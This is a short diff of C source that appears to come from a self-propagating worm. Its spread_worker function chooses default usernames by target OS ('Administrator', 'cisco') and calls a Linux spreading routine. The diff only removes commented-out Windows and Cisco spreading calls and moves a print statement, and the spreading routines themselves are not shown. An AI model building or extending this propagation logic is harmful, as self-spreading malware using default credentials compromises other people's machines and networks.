@@ -71,18 +71,16 @@ void* spread_worker(void* data) {
             spread_linux(host_ip, username, password);
         } else if (host_os == WINDOWS) {
             username = "Administrator";
-            // spread_windows(host_ip, username, password);
         } else {
             username = "cisco";
-            // spread_cisco(host_ip, username, password);
         }
-       
-             printf("%s\n", username);
 
+        printf("%s\n", username);
     }
     free(data);
     return NULL;
 }
+
 
 /**
  * Connects to a remote host and executes a command.
